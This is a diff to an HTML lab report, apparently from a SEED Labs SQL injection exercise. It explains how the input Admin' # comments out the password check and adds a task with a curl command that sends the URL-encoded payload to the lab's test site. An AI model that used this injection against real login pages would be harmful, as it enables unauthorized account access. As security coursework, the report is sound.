@@ -36,5 +36,15 @@
    FROM credential<br>
    WHERE name= 'Admin' #' and Password='***'
    </p>
-<p>Then statement after # will bi regarded as comments. So we can login in as Admin.
+<p>"Then statement after" <code>#</code>"will bi regarded as comments. So we can login in as"<code> Admin</code>.</p>
 <p>Screen shoot is in SQL Injection Folder</p>
+<h2>Task 2.2</h2>
+<pre>
+<code>
+curl 'http://www.seedlabsqlinjection.com/unsafe_home.php?username=Admin%27%20%23Password=xyz'
+</code>
+</pre>
+<p>"It will return a bunch of" <code>html</code>"code. When exporting outputs to file by"<code> > temp.html</code>"and open it"</p>
+<p>Screen shoot is in SQL Injection Folder</p>
+
+
